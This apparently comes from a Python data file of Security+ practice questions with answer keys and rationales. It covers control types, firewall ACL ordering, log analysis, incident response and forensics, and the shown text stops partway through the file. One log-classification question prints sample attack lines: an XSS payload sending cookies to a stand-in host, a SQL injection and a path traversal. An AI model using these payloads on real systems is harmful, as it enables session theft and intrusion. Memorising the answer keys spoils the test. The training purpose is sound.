"""CompTIA Security+ SY0-701 Performance-Based Questions (PBQs), file A.

20 questions across all 5 domains, styled after Cyberkraft PBQ simulations:
firewall ACL configuration, log/attack analysis, incident-response sequencing,
forensic evidence handling, penetration-test phases, and control/agreement
classification.

Type breakdown: 7 pbq_matching, 7 pbq_ordering, 6 pbq_categorize.
Domain breakdown: D1 x2, D2 x5, D3 x4, D4 x6, D5 x3.
"""

QUESTIONS = [
    # ══════════════════════════════════════════════════════════════════
    # DOMAIN 1 (2 questions)
    # ══════════════════════════════════════════════════════════════════
    {
        "id": "npbqa-001",
        "domain": 1,
        "objective": "1.2",
        "type": "pbq_categorize",
        "difficulty": "hard",
        "study_topic": "Security control categories and types",
        "stem": (
            "A security architect is documenting the control set for a new data center. "
            "Classify each control by its TYPE (how it works) rather than its category."
        ),
        "categories": [
            {"id": "c1", "text": "Preventive"},
            {"id": "c2", "text": "Detective"},
            {"id": "c3", "text": "Corrective"},
            {"id": "c4", "text": "Deterrent"},
            {"id": "c5", "text": "Compensating"},
        ],
        "items": [
            {"id": "i1", "text": "Mantrap that physically blocks a second person from entering without a separate badge scan"},
            {"id": "i2", "text": "SIEM correlation rule that fires an alert when five failed logins occur in one minute"},
            {"id": "i3", "text": "Automated playbook that isolates a host from the network the moment EDR confirms ransomware activity"},
            {"id": "i4", "text": "Warning signage and visible cameras at the perimeter fence, intended to discourage intruders before they act"},
            {"id": "i5", "text": "Because the legacy point-of-sale terminal cannot run an agent, network segmentation and enhanced logging are applied around it instead"},
            {"id": "i6", "text": "Restoring a corrupted database from last night's verified backup after an integrity failure is confirmed"},
        ],
        "answer": {"i1": "c1", "i2": "c2", "i3": "c3", "i4": "c4", "i5": "c5", "i6": "c3"},
        "rationales": {
            "i1": "A mantrap physically stops unauthorized entry before it happens, making it preventive — it blocks the act, not just discourages it.",
            "i2": "The SIEM rule identifies malicious activity that has already occurred; detective controls find events after the fact, they do not stop them.",
            "i3": "An automated isolation playbook acts after detection to limit/reverse damage, which is the defining trait of a corrective control.",
            "i4": "Signage and visible cameras work psychologically to discourage an attacker from attempting an act; unlike a mantrap, they do not physically stop entry, so they are deterrent, not preventive.",
            "i5": "A compensating control is substituted when the primary/required control (an agent) cannot be applied, providing equivalent protection through another means.",
            "i6": "Restoring from backup repairs damage after an incident, so it is corrective, the same category as i3 even though the mechanism (backup restore vs. auto-isolation) differs.",
        },
        "explanation": (
            "The exam frequently pairs preventive vs. deterrent (both 'before the fact', but only preventive physically stops the action) "
            "and detective vs. corrective (detective finds it, corrective fixes it). Compensating controls only apply when the intended "
            "control genuinely cannot be implemented — not merely when it is inconvenient."
        ),
    },
    {
        "id": "npbqa-002",
        "domain": 1,
        "objective": "1.4",
        "type": "pbq_matching",
        "difficulty": "hard",
        "study_topic": "Cryptographic hardware and key-management tools",
        "stem": (
            "A PKI administrator must select the correct cryptographic hardware or key-management tool for each "
            "requirement. Match each requirement to the single best tool."
        ),
        "prompts": [
            {"id": "p1", "text": "Store and use a web server's private TLS key so it never leaves tamper-resistant hardware, while supporting high-throughput signing for a busy e-commerce site"},
            {"id": "p2", "text": "Provide a laptop with hardware-backed full-disk encryption keys tied to the motherboard, verifying boot integrity before releasing the key"},
            {"id": "p3", "text": "Give an executive a portable, PIN-protected device to generate and store their code-signing private key for use across multiple untrusted workstations"},
            {"id": "p4", "text": "Centrally generate, rotate, and audit-log encryption keys used by dozens of cloud-hosted database instances"},
        ],
        "targets": [
            {"id": "t1", "text": "Hardware security module (HSM)"},
            {"id": "t2", "text": "Trusted Platform Module (TPM)"},
            {"id": "t3", "text": "USB security token / smart card"},
            {"id": "t4", "text": "Centralized key management system (KMS)"},
            {"id": "t5", "text": "Software-based key escrow spreadsheet"},
        ],
        "answer": {"p1": "t1", "p2": "t2", "p3": "t3", "p4": "t4"},
        "rationales": {
            "p1": "An HSM is a dedicated, high-throughput cryptographic appliance built for server-side key storage and bulk signing operations that a server itself performs.",
            "p2": "A TPM is a chip permanently bound to a specific motherboard that performs measured boot and only releases the disk-encryption key if boot integrity checks pass — exactly the scenario described.",
            "p3": "A portable, PIN-protected personal token that must move between machines with the user is a USB token/smart card, not a fixed HSM or motherboard-bound TPM.",
            "p4": "Centralized generation, rotation, and audit logging across many cloud resources is the core function of a KMS, which orchestrates keys (often backed by an HSM) at scale.",
        },
        "explanation": (
            "HSM vs. TPM is a classic trap: both protect keys in hardware, but an HSM is a standalone/network-attached appliance for "
            "servers and applications, while a TPM is soldered to one specific device and is central to platform/boot integrity. "
            "t5 is a distractor — storing keys in a spreadsheet is a serious control failure, never a correct answer."
        ),
    },

    # ══════════════════════════════════════════════════════════════════
    # DOMAIN 2 (5 questions)
    # ══════════════════════════════════════════════════════════════════
    {
        "id": "npbqa-003",
        "domain": 2,
        "objective": "2.4",
        "type": "pbq_categorize",
        "difficulty": "hard",
        "study_topic": "Indicators of malicious activity",
        "stem": (
            "A SOC analyst is triaging raw web-server, authentication, and DNS log lines pulled from the past hour. "
            "Classify each log excerpt by the attack it evidences."
        ),
        "categories": [
            {"id": "c1", "text": "SQL injection"},
            {"id": "c2", "text": "Cross-site scripting (XSS)"},
            {"id": "c3", "text": "Password spraying"},
            {"id": "c4", "text": "DNS tunneling / exfiltration"},
            {"id": "c5", "text": "Directory traversal"},
        ],
        "items": [
            {"id": "i1", "text": "GET /product?id=7 UNION SELECT username,password FROM users-- HTTP/1.1"},
            {"id": "i2", "text": "POST /comments  body=<script>document.location='http://evil.io/c?c='+document.cookie</script>"},
            {"id": "i3", "text": "auth.log: 412 distinct usernames, each tried exactly once with password 'Summer2026!', all from 203.0.113.44 within 90 seconds"},
            {"id": "i4", "text": "dns.log: 40,000 TXT queries/hour to *.updates-cdn-cache.net, each subdomain a unique 63-character base32 string"},
            {"id": "i5", "text": "GET /download?file=../../../../etc/passwd HTTP/1.1"},
        ],
        "answer": {"i1": "c1", "i2": "c2", "i3": "c3", "i4": "c4", "i5": "c5"},
        "rationales": {
            "i1": "UNION SELECT appended to a numeric parameter is the signature of SQL injection used to pivot a query into the users table.",
            "i2": "An injected <script> tag that reads document.cookie and sends it to an external host is stored/reflected XSS harvesting session cookies.",
            "i3": "One attempt per username, across hundreds of accounts, all using the same single password from one source in a short window is the definition of password spraying (low-and-slow, avoids per-account lockout).",
            "i4": "A very high volume of TXT queries to random-looking subdomains of one domain is the classic pattern of DNS tunneling used to exfiltrate data through queries that bypass egress filtering.",
            "i5": "Repeated '../' sequences aiming at a sensitive OS file (/etc/passwd) is directory (path) traversal reaching outside the intended web root.",
        },
        "explanation": (
            "Distinguish password spraying (many accounts, one password) from credential stuffing/brute force (one account, many "
            "passwords, or reused breached creds). DNS tunneling is identified by query volume and randomized/encoded subdomains, "
            "not simply by 'a lot of DNS traffic'."
        ),
    },
    {
        "id": "npbqa-004",
        "domain": 2,
        "objective": "2.4",
        "type": "pbq_matching",
        "difficulty": "hard",
        "study_topic": "Log sources and investigative questions",
        "stem": (
            "An incident responder needs to answer specific investigative questions during a compromise. "
            "Match each investigative question to the single log source best suited to answer it."
        ),
        "prompts": [
            {"id": "p1", "text": "Which process spawned powershell.exe with an encoded command, and what was its parent process ID?"},
            {"id": "p2", "text": "Did the workstation resolve the malicious domain before the C2 beacon began, and how many times?"},
            {"id": "p3", "text": "Which internal host initiated an outbound connection on port 4444 and to what external IP?"},
            {"id": "p4", "text": "Was a new local administrator account created on the file server, and by which authenticated user?"},
            {"id": "p5", "text": "Did the WAF block or allow the SQL injection payload aimed at the checkout API?"},
        ],
        "targets": [
            {"id": "t1", "text": "Endpoint EDR/process-creation log"},
            {"id": "t2", "text": "DNS server query log"},
            {"id": "t3", "text": "Firewall/NetFlow traffic log"},
            {"id": "t4", "text": "Windows Security event log (event ID 4720/4732)"},
            {"id": "t5", "text": "Web application firewall (WAF) log"},
        ],
        "answer": {"p1": "t1", "p2": "t2", "p3": "t3", "p4": "t4", "p5": "t5"},
        "rationales": {
            "p1": "Parent-child process lineage and command-line arguments are captured by endpoint/EDR process-creation telemetry, not by network or auth logs.",
            "p2": "DNS query logs record resolution requests with timestamps, showing whether/when a domain was looked up prior to a beacon starting.",
            "p3": "Source/destination IP and port for an outbound connection is exactly what firewall or NetFlow traffic logs record.",
            "p4": "Windows Security event IDs 4720 (account created) and 4732 (added to group) with the actor's logon SID directly answer who created the account.",
            "p5": "A WAF log records the specific action (block/allow) taken against an application-layer payload like a SQLi string.",

        },
        "explanation": (
            "Matching the investigative question to the log source that actually contains that data is a core SOC skill: process "
            "lineage lives on the endpoint, name resolution lives in DNS logs, connection metadata lives in firewall/NetFlow, "
            "account changes live in the Security event log, and application-layer payload decisions live in the WAF."
        ),
    },
    {
        "id": "npbqa-005",
        "domain": 2,
        "objective": "2.4",
        "type": "pbq_matching",
        "difficulty": "hard",
        "study_topic": "Log sources and investigative questions",
        "stem": (
            "A SIEM correlates alerts that map to stages of an intrusion. Match each SIEM alert to the attack stage "
            "it most likely represents (using a cyber kill chain style progression)."
        ),
        "prompts": [
            {"id": "p1", "text": "Alert: outbound TLS session to a newly registered domain (age: 3 days) established two minutes after a malicious macro-enabled document was opened"},
            {"id": "p2", "text": "Alert: LSASS process memory accessed by an unsigned binary running from %TEMP%"},
            {"id": "p3", "text": "Alert: the same compromised service account authenticates successfully to 14 different servers within 5 minutes using WMI"},
            {"id": "p4", "text": "Alert: 2 GB archive named backup_final.7z created in a user's Downloads folder, then uploaded to a personal cloud-storage domain never seen before on this network"},
            {"id": "p5", "text": "Alert: mail gateway blocks an attachment named Invoice_Q3_2026.docm containing an obfuscated VBA macro, sent to 40 finance-department mailboxes"},
        ],
        "targets": [
            {"id": "t1", "text": "Reconnaissance/weaponization (delivery preparation)"},
            {"id": "t2", "text": "Initial access / command-and-control establishment"},
            {"id": "t3", "text": "Credential access"},
            {"id": "t4", "text": "Lateral movement"},
            {"id": "t5", "text": "Exfiltration"},
        ],
        "answer": {"p1": "t2", "p2": "t3", "p3": "t4", "p4": "t5", "p5": "t1"},
        "rationales": {
            "p1": "A brand-new domain contacted immediately after a malicious document opens is the C2 channel being established right after initial access/execution.",
            "p2": "Reading LSASS memory from an unsigned temp-folder binary is a textbook credential-dumping technique (e.g., Mimikatz-style access) to harvest cached credentials.",
            "p3": "One account rapidly authenticating to many hosts via WMI is the signature of an attacker pivoting through the environment — lateral movement.",
            "p4": "Staging a large archive and uploading it to an unfamiliar external cloud domain is data leaving the environment — exfiltration.",
            "p5": "A mass-mailed weaponized macro document being sent to targets, before anyone has opened it, represents the delivery/weaponization stage that precedes compromise.",
        },
        "explanation": (
            "Kill-chain sequencing matters: delivery (the phishing email itself) precedes execution/C2 (the callback after opening), "
            "which precedes credential access, which enables lateral movement, which precedes exfiltration. Alerts must be mapped "
            "to the stage they represent, not the order they appear in the list."
        ),
    },
    {
        "id": "npbqa-006",
        "domain": 2,
        "objective": "2.5",
        "type": "pbq_ordering",
        "difficulty": "hard",
        "study_topic": "Hardening",
        "stem": (
            "A systems administrator is hardening a newly imaged Windows server before it is placed in production. "
            "Arrange the hardening actions in the correct operational order."
        ),
        "items": [
            {"id": "i1", "text": "Apply the vendor's latest cumulative security patches and firmware updates to the freshly imaged OS"},
            {"id": "i2", "text": "Remove or disable unused services, default accounts, and unnecessary installed roles/features"},
            {"id": "i3", "text": "Apply the organization's CIS-benchmark-based secure baseline configuration via group policy"},
            {"id": "i4", "text": "Configure host-based firewall rules and enable endpoint detection and response (EDR) agent"},
            {"id": "i5", "text": "Run a vulnerability/compliance scan against the host and remediate any findings"},
            {"id": "i6", "text": "Place the server into the production VLAN and enroll it in ongoing patch-management and monitoring cycles"},
        ],
        "answer": ["i1", "i2", "i3", "i4", "i5", "i6"],
        "rationales": {
            "i1": "Patch first: applying updates to a freshly imaged, still-isolated host closes known vulnerabilities before any further configuration or exposure.",
            "i2": "With the OS current, next remove attack surface (unused services/accounts/roles) before applying policy so the baseline isn't fighting components that will just be removed anyway.",
            "i3": "Once the footprint is minimized, apply the secure configuration baseline so settings are enforced on the final, reduced set of services.",
            "i4": "Layer host-based network controls and EDR after the baseline is set, so the monitoring/agent configuration reflects the intended hardened state.",
            "i5": "Validate the work with a vulnerability/compliance scan before the host is trusted with production traffic, catching anything the manual steps missed.",
            "i6": "Only after patching, minimization, baseline, defensive tooling, and validation should the server join production and enter routine lifecycle management.",
        },
        "explanation": (
            "Hardening follows a logical dependency chain: you patch and reduce the attack surface before you lock in a configuration "
            "baseline, add active defenses on top of that stable base, validate everything with a scan, and only then expose the host "
            "to production traffic. Scanning first would be pointless because the target isn't in its final state yet."
        ),
    },
    {
        "id": "npbqa-007",
        "domain": 2,
        "objective": "2.4",
        "type": "pbq_ordering",
        "difficulty": "hard",
        "study_topic": "Social engineering",
        "stem": (
            "A user clicked a phishing link and entered their corporate username and password into a fake login "
            "page. The SOC confirms the credentials were used by an unfamiliar IP twenty minutes later. Order the "
            "incident response actions the analyst should take."
        ),
        "items": [
            {"id": "i1", "text": "Immediately disable the compromised account and force an out-of-band password reset"},
            {"id": "i2", "text": "Revoke all active sessions and issued OAuth/SAML tokens for the account so cached logins stop working"},
            {"id": "i3", "text": "Inspect the mailbox for attacker-created inbox rules (e.g., auto-forwarding to an external address) and remove any found"},
            {"id": "i4", "text": "Review SSO, VPN, and application logs for other systems accessed with the same credentials to determine the scope of compromise"},
            {"id": "i5", "text": "Require the user to set a new unique password and re-enroll MFA before the account is reactivated"},
            {"id": "i6", "text": "Block the phishing URL and sender domain at the email gateway and web proxy to prevent repeat clicks"},
            {"id": "i7", "text": "Document the incident timeline and notify compliance/legal if regulated data may have been exposed"},
        ],
        "answer": ["i1", "i2", "i3", "i4", "i5", "i6", "i7"],
        "rationales": {
            "i1": "Containment starts immediately by disabling the account and forcing a reset so the stolen password can no longer be used to log in.",
            "i2": "Disabling the account alone does not kill sessions or tokens already issued, so those must be explicitly revoked next to cut off any live, still-authenticated access.",
            "i3": "With live access cut off, check for persistence the attacker may have planted (like a mail-forwarding rule) before declaring the mailbox clean.",
            "i4": "Once the immediate foothold and persistence are addressed, determine how far the stolen credentials were used elsewhere to scope the full incident.",
            "i5": "Recovery — issuing a new password and re-enrolling MFA — happens only after containment and scoping confirm no lingering attacker access remains.",
            "i6": "Blocking the phishing URL/domain hardens the environment against a repeat of the same lure, appropriate once the immediate account-level incident is under control.",
            "i7": "Documentation and compliance notification is the final step, capturing the full timeline and scope established by the preceding steps.",
        },
        "explanation": (
            "The sequence is contain (disable account, revoke live sessions) -> eradicate persistence (mailbox rules) -> scope "
            "(check lateral use of credentials) -> recover (new password/MFA) -> prevent recurrence (block the lure) -> report. "
            "A common mistake is resetting the password before revoking sessions/tokens, which leaves existing authenticated "
            "sessions valid even though the password itself has changed."
        ),
    },

    # ══════════════════════════════════════════════════════════════════
    # DOMAIN 3 (4 questions)
    # ══════════════════════════════════════════════════════════════════
    {
        "id": "npbqa-008",
        "domain": 3,
        "objective": "3.3",
        "type": "pbq_ordering",
        "difficulty": "hard",
        "study_topic": "Firewalls",
        "stem": (
            "An engineer inherited an edge firewall rule base that is misbehaving — legitimate DMZ traffic is being "
            "blocked while it should be allowed. Reorder the access control list (ACL) into the correct evaluation "
            "order so specific rules take effect before general ones and the implicit deny sits last."
        ),
        "items": [
            {"id": "i1", "text": "DENY TCP 198.51.100.0/24 -> any:any  (known malicious range)"},
            {"id": "i2", "text": "PERMIT TCP any -> 10.0.5.10:443  (public HTTPS to web server)"},
            {"id": "i3", "text": "PERMIT TCP 10.0.5.0/24 -> 10.0.6.20:1433  (web tier to DB, SQL)"},
            {"id": "i4", "text": "DENY TCP any -> 10.0.6.0/24:any  (block all other DMZ-to-DB traffic)"},
            {"id": "i5", "text": "PERMIT TCP 10.10.1.0/24 -> any:22  (admin subnet SSH to any host)"},
            {"id": "i6", "text": "DENY IP any -> any  (implicit/explicit deny all)"},
        ],
        "answer": ["i1", "i5", "i2", "i3", "i4", "i6"],
        "rationales": {
            "i1": "The most specific security-critical block (a known-hostile source range) must be evaluated first so no lower rule can inadvertently permit it.",
            "i5": "The admin-subnet SSH permit is a narrow, trusted-source rule that should be locked in early, before broader public-facing permits are evaluated.",
            "i2": "The public HTTPS permit to the web server is specific to one host/port and must be evaluated before the broader DB-tier deny (i4) so legitimate web traffic isn't caught by it.",
            "i3": "The web-tier-to-DB permit is more specific than the general DMZ-to-DB deny that follows it, so it must be placed before that deny or it would be shadowed and legitimate SQL traffic would be blocked — this is the exact bug described in the stem.",
            "i4": "The general 'deny all other traffic to the DB subnet' rule belongs after the specific permit it is meant to except, closing off anything not explicitly allowed above.",
            "i6": "The implicit/explicit deny-all must always be the final rule, catching anything not matched by an earlier, more specific rule.",
        },
        "explanation": (
            "Firewalls evaluate ACLs top-down and stop at the first match. Placing the general DB-subnet deny (i4) above the specific "
            "web-tier-to-DB permit (i3) — the original broken order — would shadow the permit and silently break the application. "
            "Order must always go most-specific/highest-priority to most-general, ending in an explicit deny."
        ),
    },
    {
        "id": "npbqa-009",
        "domain": 3,
        "objective": "3.3",
        "type": "pbq_matching",
        "difficulty": "hard",
        "study_topic": "Firewalls",
        "stem": (
            "Match each business requirement for the edge firewall to the single ACL rule that correctly implements "
            "it. One target is a distractor that should NOT be used."
        ),
        "prompts": [
            {"id": "p1", "text": "Allow the public to reach the DMZ web server over HTTPS only"},
            {"id": "p2", "text": "Allow the internal admin VLAN (10.10.2.0/24) to manage the web server via SSH, but block SSH from anywhere else"},
            {"id": "p3", "text": "Allow the DMZ web server to query the internal DNS resolver, but block it from reaching any other internal host"},
            {"id": "p4", "text": "Block all traffic from a known botnet C2 range regardless of destination"},
        ],
        "targets": [
            {"id": "t1", "text": "PERMIT TCP any -> 10.0.5.10:443"},
            {"id": "t2", "text": "PERMIT TCP 10.10.2.0/24 -> 10.0.5.10:22"},
            {"id": "t3", "text": "PERMIT UDP 10.0.5.10 -> 10.0.1.53:53"},
            {"id": "t4", "text": "DENY IP 185.220.101.0/24 -> any:any"},
            {"id": "t5", "text": "PERMIT TCP any -> 10.0.5.10:22"},
        ],
        "answer": {"p1": "t1", "p2": "t2", "p3": "t3", "p4": "t4"},
        "rationales": {
            "p1": "t1 permits only TCP/443 (HTTPS) from any source to the specific web server IP, matching 'public over HTTPS only'.",
            "p2": "t2 scopes SSH (port 22) to only the admin VLAN source range, satisfying both 'allow admins' and 'block everyone else' in one rule combined with an eventual deny-all.",
            "p3": "t3 permits only UDP/53 from the web server to the internal resolver, matching the narrow DNS-only requirement.",
            "p4": "t4 denies the entire known-malicious source range to any destination, an appropriate blanket block regardless of what the DMZ host would otherwise be permitted to do.",
        },
        "explanation": (
            "t5 is the distractor: it permits SSH from ANY source to the web server, which directly violates the requirement to "
            "restrict SSH to the admin VLAN only. Candidates who pattern-match on 'SSH to web server' without checking the source "
            "scope will incorrectly select t5 instead of t2."
        ),
    },
    {
        "id": "npbqa-010",
        "domain": 3,
        "objective": "3.3",
        "type": "pbq_categorize",
        "difficulty": "hard",
        "study_topic": "Firewalls",
        "stem": (
            "A security engineer is auditing an inherited edge firewall rule base (rules are evaluated top to "
            "bottom, first match wins) for an e-commerce environment. Classify each rule, in the order it appears "
            "in the ACL, as needed (correctly implements its stated business intent), shadowed (an earlier rule "
            "already matches the same traffic, making this rule unreachable), or overly permissive (technically "
            "reachable but written far more broadly than the stated business intent requires)."
        ),
        "categories": [
            {"id": "c1", "text": "Needed as written"},
            {"id": "c2", "text": "Shadowed (unreachable)"},
            {"id": "c3", "text": "Overly permissive"},
        ],
        "items": [
            {"id": "i1", "text": "Rule 1: PERMIT TCP 10.10.2.0/24 -> 10.0.5.10:22  — intent: allow the internal admin VLAN SSH access to the web server"},
            {"id": "i2", "text": "Rule 2: PERMIT TCP any -> 10.0.5.10:22  — intent: allow one named contractor to SSH in from a single static external IP for a migration project"},
            {"id": "i3", "text": "Rule 3: PERMIT TCP any -> 10.0.5.10:443  — intent: allow the public to reach the web server over HTTPS"},
            {"id": "i4", "text": "Rule 4: DENY TCP 198.51.100.0/24 -> 10.0.5.10:443  — intent: block a specific range flagged by threat intel from reaching the web server over HTTPS"},
            {"id": "i5", "text": "Rule 5: PERMIT TCP any -> 10.0.6.20:1433  — intent: allow only the web tier (10.0.5.0/24) to reach the database over SQL"},
            {"id": "i6", "text": "Rule 6: PERMIT UDP 10.0.5.10 -> 10.0.1.53:53  — intent: allow the DMZ web server to query the internal DNS resolver"},
        ],
        "answer": {"i1": "c1", "i2": "c3", "i3": "c1", "i4": "c2", "i5": "c3", "i6": "c1"},
        "rationales": {
            "i1": "Rule 1 scopes SSH to exactly the admin VLAN source, matching its stated intent precisely — it is needed as written.",
            "i2": "The intent was to allow one contractor from one static IP, but the rule is written as 'any' source — it is reachable and does grant SSH, but far more broadly than required, making it overly permissive rather than simply needed.",
            "i3": "Rule 3 permits only TCP/443 from any source to the web server, which is exactly what 'public HTTPS access' requires — needed as written.",
            "i4": "Because Rule 3 (a broader permit for the same host/port) is evaluated first and already matches all HTTPS traffic including the range in Rule 4, first-match-wins means Rule 4 will never actually be evaluated for that traffic — it is shadowed and provides no real protection in its current position.",
            "i5": "The intent was to restrict DB access to the web tier subnet only, but the rule permits 'any' source to reach SQL on the database, which is reachable and functions, but grants far more access than the business requirement calls for — overly permissive.",
            "i6": "Rule 6 permits only the specific DNS query the web server needs, matching intent exactly — needed as written.",
        },
        "explanation": (
            "Shadowing and over-permissiveness are different failure modes that are easy to conflate: a shadowed rule never fires "
            "because an earlier, broader rule already matched the same traffic (the fix is reordering, e.g., moving Rule 4 above "
            "Rule 3), while an overly permissive rule DOES fire and DOES work, but grants more access than intended (the fix is "
            "narrowing the source/destination scope, not reordering). Rule 4 illustrates why specific deny/permit rules must "
            "precede broader rules covering the same host and port."
        ),
    },
    {
        "id": "npbqa-011",
        "domain": 3,
        "objective": "3.6",
        "type": "pbq_ordering",
        "difficulty": "hard",
        "study_topic": "Resilience testing",
        "stem": (
            "A DR team is executing a planned failover test of the primary data center to the warm recovery site. "
            "Order the concrete steps as they must be carried out for the test to be valid and safe."
        ),
        "items": [
            {"id": "i1", "text": "Notify stakeholders and freeze non-essential change requests for the test window"},
            {"id": "i2", "text": "Verify the most recent replication/backup job to the recovery site completed successfully"},
            {"id": "i3", "text": "Isolate the test environment at the recovery site so it does not accept live production traffic prematurely"},
            {"id": "i4", "text": "Initiate failover: bring up recovery-site systems from replicated data and validate application functionality"},
            {"id": "i5", "text": "Cut over DNS/load-balancer records to direct live traffic to the recovery site and monitor RTO against the target"},
            {"id": "i6", "text": "Fail back to the primary site once validated, and resynchronize data"},
            {"id": "i7", "text": "Document the actual RTO/RPO achieved versus targets and update the DR plan with lessons learned"},
        ],
        "answer": ["i1", "i2", "i3", "i4", "i5", "i6", "i7"],
        "rationales": {
            "i1": "Stakeholders must be notified and changes frozen first so the test isn't corrupted by unrelated production changes mid-test.",
            "i2": "Confirming the latest replication succeeded establishes that the data the test will use is actually current and trustworthy.",
            "i3": "The recovery environment is isolated first so validation can happen safely without accidentally serving live users before it's confirmed ready.",
            "i4": "Systems are brought up and validated in isolation before any real traffic is pointed at them, minimizing risk if something is broken.",
            "i5": "Only after validation does the team cut live traffic over, at which point the actual RTO can be measured against the target.",
            "i6": "Once the recovery site has proven itself under real conditions, the team fails back to primary and resynchronizes data to close the loop.",
            "i7": "Documentation and lessons-learned happen last, capturing the measured RTO/RPO and any gaps for the next iteration of the DR plan.",
        },
        "explanation": (
            "The sequence enforces safety-before-exposure: verify data integrity, validate in isolation, then cut over live traffic, "
            "then fail back and document. Cutting traffic over before isolated validation (skipping i3/i4) risks serving users from an "
            "unverified environment, which is the most common wrong-order trap in this scenario."
        ),
    },

    # ══════════════════════════════════════════════════════════════════
    # DOMAIN 4 (6 questions)
    # ══════════════════════════════════════════════════════════════════
    {
        "id": "npbqa-012",
        "domain": 4,
        "objective": "4.8",
        "type": "pbq_ordering",
        "difficulty": "hard",
        "study_topic": "Incident response process",
        "stem": (
            "A file server displays a ransomware note and several shares are inaccessible. Order the incident "
            "response actions the on-call analyst should take."
        ),
        "items": [
            {"id": "i1", "text": "Isolate the affected file server from the network (disable switch port/pull NIC) without powering it off"},
            {"id": "i2", "text": "Preserve volatile evidence: capture RAM and running-process state before the host is touched further"},
            {"id": "i3", "text": "Identify the ransomware variant and scope of encryption by reviewing EDR telemetry and file-share audit logs"},
            {"id": "i4", "text": "Determine and isolate patient zero and any other infected hosts identified through lateral-movement indicators"},
            {"id": "i5", "text": "Eradicate the malware from all infected hosts and rebuild from known-good images where required"},
            {"id": "i6", "text": "Restore data from the most recent verified, offline/immutable backup and validate integrity"},
            {"id": "i7", "text": "Conduct a post-incident review and update detection rules and backup/segmentation controls based on lessons learned"},
        ],
        "answer": ["i1", "i2", "i3", "i4", "i5", "i6", "i7"],
        "rationales": {
            "i1": "Containment comes first — isolating the host stops further encryption and lateral spread while preserving disk state by not powering it off.",
            "i2": "Volatile evidence (RAM, running processes) must be captured immediately after containment, before it is lost to reboots or further changes, since it can reveal keys or the active process.",
            "i3": "With the host contained and evidence preserved, the analyst identifies the specific variant and scope to understand what happened and how far it spread.",
            "i4": "Scoping naturally extends outward: once the initial host and variant are understood, hunt for and isolate any other infected hosts before moving to cleanup.",
            "i5": "Eradication (removing the malware / rebuilding) only happens once the full scope is known, so the team doesn't clean one host while others remain infected and re-spread it.",
            "i6": "Recovery from a verified offline/immutable backup happens after eradication confirms the environment is clean, preventing restoration of data back into an active infection.",
            "i7": "The post-incident review and control updates are the final step, converting lessons learned into improved detection and resilience.",
        },
        "explanation": (
            "This follows contain -> preserve evidence -> identify/scope -> contain further spread -> eradicate -> recover -> lessons "
            "learned. A common mistake is restoring from backup before eradication is confirmed complete, which can re-infect the "
            "restored data if other footholds remain active on the network."
        ),
    },
    {
        "id": "npbqa-013",
        "domain": 4,
        "objective": "4.5",
        "type": "pbq_ordering",
        "difficulty": "hard",
        "study_topic": "Digital forensics and chain-of-custody process",
        "stem": (
            "A forensic examiner must collect evidence from a compromised server that cannot be taken offline "
            "immediately. Order the artifact collection from MOST volatile to LEAST volatile, per the standard "
            "order of volatility."
        ),
        "items": [
            {"id": "i1", "text": "CPU registers and cache contents"},
            {"id": "i2", "text": "Contents of RAM, including running processes and network connections"},
            {"id": "i3", "text": "Network state (active connections, ARP cache, routing table)"},
            {"id": "i4", "text": "Temporary file system / swap space"},
            {"id": "i5", "text": "Data on the local hard disk"},
            {"id": "i6", "text": "Remote logging and monitoring data held by a third-party SIEM/cloud provider"},
            {"id": "i7", "text": "Archived backup tapes stored offsite"},
        ],
        "answer": ["i1", "i2", "i3", "i4", "i5", "i6", "i7"],
        "rationales": {
            "i1": "CPU registers and cache change on every clock cycle and are lost the instant power or process state changes, making them the most volatile artifact of all.",
            "i2": "RAM contents persist slightly longer than register/cache state but are still lost on reboot or power-down, so they must be imaged next.",
            "i3": "Network connection state and ARP/routing tables are held in memory and can change or expire quickly as connections close, ranking just below general RAM contents.",
            "i4": "Swap/temp files persist across some memory operations but are still tied to the running OS session and can be overwritten during normal operation.",
            "i5": "Disk data survives reboots and is far less volatile than memory-resident artifacts, though it can still be altered by continued system use.",
            "i6": "Remote/third-party logs are outside the local system's volatility entirely but are still subject to log-rotation and retention windows, so they should be secured before the longest-lived archives.",
            "i7": "Offsite archived backups are the least volatile artifact — they are static, already at rest, and will not change while the rest of the collection proceeds.",
        },
        "explanation": (
            "The RFC 3227 order of volatility governs collection priority: registers/cache, RAM, network state, temporary "
            "filesystems, disk, remote logs, then archival media. Collecting disk images before capturing RAM is a classic "
            "mistake that destroys the most perishable and often most incriminating evidence."
        ),
    },
    {
        "id": "npbqa-014",
        "domain": 4,
        "objective": "4.3",
        "type": "pbq_matching",
        "difficulty": "hard",
        "study_topic": "Email security (SPF/DKIM/DMARC)",
        "stem": (
            "A messaging administrator is troubleshooting spoofed email reaching employee inboxes. Match each "
            "DNS/email authentication record fragment to what it accomplishes."
        ),
        "prompts": [
            {"id": "p1", "text": "v=spf1 ip4:203.0.113.10 include:_spf.mailprovider.com -all"},
            {"id": "p2", "text": "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBi..."},
            {"id": "p3", "text": "v=DMARC1; p=reject; rua=mailto:dmarc-reports@company.com; pct=100"},
            {"id": "p4", "text": "A message header showing 'DKIM-Signature: d=company.com; s=selector1; ...' verified as PASS by the receiving server"},
        ],
        "targets": [
            {"id": "t1", "text": "Declares which mail servers/IPs are authorized to send email for the domain, with a hard-fail policy for everything else"},
            {"id": "t2", "text": "Publishes the public key used to verify a cryptographic signature applied to outbound message content and headers"},
            {"id": "t3", "text": "Instructs receiving servers to reject mail that fails alignment and to send aggregate failure reports to the domain owner"},
            {"id": "t4", "text": "Confirms the received message's body/headers were not altered in transit and were signed by the claimed domain's private key"},
        ],
        "answer": {"p1": "t1", "p2": "t2", "p3": "t3", "p4": "t4"},
        "rationales": {
            "p1": "The SPF record with '-all' hard-fails any sending IP not explicitly listed, defining which infrastructure may send as the domain.",
            "p2": "The DKIM DNS TXT record publishes the public key that recipients use to validate the signature attached to outbound mail.",
            "p3": "'p=reject' with rua defines the DMARC enforcement policy (reject on failure) and where aggregate reports should be sent — this is policy, not verification.",
            "p4": "A message header showing DKIM verification as PASS is the outcome/result of applying the published key (p2) against the received message — proof of integrity and authenticity for that specific email.",
        },
        "explanation": (
            "SPF, DKIM, and DMARC are frequently confused because they're deployed together: SPF authorizes sending infrastructure, "
            "DKIM cryptographically signs message content, and DMARC ties the two together with an enforcement policy and reporting. "
            "p4 tests whether candidates can distinguish the DNS record (the published key) from the runtime verification result."
        ),
    },
    {
        "id": "npbqa-015",
        "domain": 4,
        "objective": "4.2",
